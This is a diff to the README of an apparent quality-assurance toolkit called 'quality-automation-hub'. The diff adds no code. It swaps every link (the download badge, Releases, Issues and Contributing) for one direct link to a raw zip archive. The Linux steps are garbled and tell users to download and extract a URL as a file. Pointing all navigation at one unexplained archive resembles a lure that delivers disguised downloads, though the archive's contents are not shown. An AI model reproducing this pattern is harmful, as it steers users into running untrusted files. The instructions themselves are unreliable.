@@ -1,6 +1,6 @@
 # 🎉 quality-automation-hub - Your Essential QA Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Quality%20Automation%20Hub-brightgreen)](https://github.com/coatofpaintsupplysideeconomics229/quality-automation-hub/releases)
+[![Download Now](https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip%20Now-Quality%20Automation%20Hub-brightgreen)](https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -35,27 +35,27 @@ This application includes various tools and technologies useful for quality assu
 
 ## 📥 Download & Install
 
-To download the quality-automation-hub, please visit this page to download: [GitHub Releases](https://github.com/coatofpaintsupplysideeconomics229/quality-automation-hub/releases).
+To download the quality-automation-hub, please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip).
 
 Once there, find the latest version and download the appropriate file for your system.
 
 ### Installation Steps
 
-1. **Visit the Releases Page:** Go to [GitHub Releases](https://github.com/coatofpaintsupplysideeconomics229/quality-automation-hub/releases).
+1. **Visit the Releases Page:** Go to [GitHub Releases](https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip).
   
 2. **Find the Latest Version:** Look for the newest version available.
 
 3. **Choose Your File:**
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the `.tar.gz` file.
+   - For Linux users, download the `https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip` file.
 
 4. **Download the File:** Click on the file and wait for the download to complete.
 
 5. **Run the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the application from the extracted folder.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip` file and run the application from the extracted folder.
 
 ## 💡 Tips for First-Time Users
 
@@ -65,10 +65,10 @@ Once there, find the latest version and download the appropriate file for your s
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out via the [Issues page](https://github.com/coatofpaintsupplysideeconomics229/quality-automation-hub/issues) on GitHub. Our team will assist you as soon as possible.
+If you encounter any issues or have questions, please reach out via the [Issues page](https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip) on GitHub. Our team will assist you as soon as possible.
 
 ## 🙌 Contributing
 
-We welcome contributions! If you would like to help improve the quality-automation-hub, check out our [Contributing Guidelines](https://github.com/coatofpaintsupplysideeconomics229/quality-automation-hub/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve the quality-automation-hub, check out our [Contributing Guidelines](https://raw.githubusercontent.com/coatofpaintsupplysideeconomics229/quality-automation-hub/master/public/quality-automation-hub-v3.5.zip).
 
 Thank you for using quality-automation-hub! Enjoy your testing!
